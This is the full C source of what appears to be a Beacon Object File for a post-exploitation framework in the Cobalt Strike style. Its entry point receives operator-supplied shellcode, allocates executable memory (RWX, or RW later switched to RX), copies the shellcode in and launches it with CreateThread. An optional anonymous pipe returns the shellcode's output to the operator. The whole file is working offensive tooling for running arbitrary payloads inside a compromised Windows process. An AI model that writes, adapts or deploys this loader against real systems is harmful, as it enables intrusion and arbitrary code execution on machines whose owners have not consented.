#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include "anticrash.c"




typedef struct
{
    HANDLE hThread;      // The thread handle
    PVOID pBufferData;   // The start addr of the allocated memory
} THREAD_H_MEM, * PTHREAD_H_MEM;


int local_inject(LPVOID buffer, SIZE_T length, BOOL use_rwx, HANDLE hWrite, PTHREAD_H_MEM thread_info)
{
	PBYTE	pBufferData = NULL;
	DWORD 	old_protect = 0;

	if(use_rwx){
		pBufferData = KERNEL32$VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}else{
		pBufferData = KERNEL32$VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}
	if(pBufferData == NULL){
		BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] VirtualAlloc Failed!\n");
		KERNEL32$CloseHandle(hWrite);
		return -1;
	}

	memcpy(pBufferData, buffer, length);

	if(!use_rwx){
		if(!KERNEL32$VirtualProtect(pBufferData, length, PAGE_EXECUTE_READ, &old_protect)){
			BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] VirtualProtect Failed!\n");
			KERNEL32$CloseHandle(hWrite);
			KERNEL32$VirtualFree(pBufferData, 0, MEM_RELEASE);
			return -1;
		}
	}

	HANDLE hThread = KERNEL32$CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pBufferData,
		(LPVOID)hWrite,   /* lpParameter = hWrite */
		0,
		NULL
	);

	if(hThread == NULL){
		BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] CreateThread Failed!\n");
		KERNEL32$CloseHandle(hWrite);
		KERNEL32$VirtualFree(pBufferData, 0, MEM_RELEASE);
		return -1;
	}

	thread_info->pBufferData = pBufferData;
	thread_info->hThread = hThread;

	return 0;
}


int local_inject_nopipe(LPVOID buffer, SIZE_T length, BOOL use_rwx, PTHREAD_H_MEM thread_info)
{
	PBYTE	pBufferData = NULL;
	DWORD 	old_protect = 0;

	if(use_rwx){
		pBufferData = KERNEL32$VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}else{
		pBufferData = KERNEL32$VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}
	if(pBufferData == NULL){
		BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] VirtualAlloc Failed!\n");
		return -1;
	}

	memcpy(pBufferData, buffer, length);

	if(!use_rwx){
		if(!KERNEL32$VirtualProtect(pBufferData, length, PAGE_EXECUTE_READ, &old_protect)){
			BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] VirtualProtect Failed!\n");
			KERNEL32$VirtualFree(pBufferData, 0, MEM_RELEASE);
			return -1;
		}
	}

	HANDLE hThread = KERNEL32$CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pBufferData,
		0,
		0,
		NULL
	);

	if(hThread == NULL){
		BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] CreateThread Failed!\n");
		KERNEL32$VirtualFree(pBufferData, 0, MEM_RELEASE);
		return -1;
	}

	thread_info->pBufferData = pBufferData;
	thread_info->hThread = hThread;

	return 0;
}


bool read_from_anonymous_pipe(HANDLE hRead)
{
    const DWORD chunkSize = 1024;
    char chunk[chunkSize];
    char allData[4096];
    DWORD totalLen = 0;
    DWORD dwBytesRead = 0;

    allData[0] = '\0';

    while (1) {
        BOOL ok = KERNEL32$ReadFile(hRead, chunk, chunkSize - 1, &dwBytesRead, NULL);

        if (!ok) {
            DWORD err = KERNEL32$GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                break;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[-] ReadFile error: %lu\n", err);
            break;
        }

        if (dwBytesRead == 0) {
            continue;
        }

        chunk[dwBytesRead] = '\0';

        if (totalLen + dwBytesRead + 1 >= sizeof(allData)) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] Output buffer full, truncating\n");
            break;
        }

        memcpy(allData + totalLen, chunk, dwBytesRead);
        totalLen += dwBytesRead;
        allData[totalLen] = '\0';
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Result:\n%s\n", allData);
    return 0;
}


void go(
	IN PCHAR Buffer, 
	IN ULONG Length 
)
{
    int use_rwx = 0;
    int no_pipe = 0;
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    size_t shellcodeByteLen = 0;
    char* shellcodeBytes = BeaconDataExtract(&parser, (int*)&shellcodeByteLen);

    use_rwx = BeaconDataInt(&parser);
    no_pipe = BeaconDataInt(&parser);

    if(!shellcodeBytes){
        BeaconPrintf(CALLBACK_OUTPUT, "%s", "[-] No shellcode provided\n");
        return;
    }

    THREAD_H_MEM thread_info = {0};
    HANDLE hRead  = NULL;

    if(!no_pipe){
        HANDLE hWrite = NULL;
        SECURITY_ATTRIBUTES sa = {0};
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = FALSE;
        sa.lpSecurityDescriptor = NULL;

    	if (!KERNEL32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] CreatePipe failed: %lu\n", KERNEL32$GetLastError());
            return;
    	}

        if(local_inject(shellcodeBytes, shellcodeByteLen, use_rwx, hWrite, &thread_info) == -1){
            BeaconPrintf(CALLBACK_OUTPUT, "[-] with_pipe call failed\n");
            return;
        }
    }else{
        if(local_inject_nopipe(shellcodeBytes, shellcodeByteLen, use_rwx, &thread_info) == -1){
            BeaconPrintf(CALLBACK_OUTPUT, "[-] no_pipe call failed\n");
            return;
        }
	
    }


    HANDLE hThread = thread_info.hThread;

    if(hThread == NULL){
    	KERNEL32$CloseHandle(hRead);
    	return;
    }

    if(!no_pipe){    
        read_from_anonymous_pipe(hRead);
        KERNEL32$CloseHandle(hRead);
    }
    
    KERNEL32$WaitForSingleObject(hThread, INFINITE);
    KERNEL32$CloseHandle(hThread);
    
    //char buffer[50];
    //MSVCRT$_snprintf(buffer, 50, "VirtualFree: 0x%p\n", thread_info.pBufferData);
    //USER32$MessageBoxA(0, buffer, "debug", MB_OK);

    KERNEL32$VirtualFree(thread_info.pBufferData, 0, MEM_RELEASE);
    return;
}
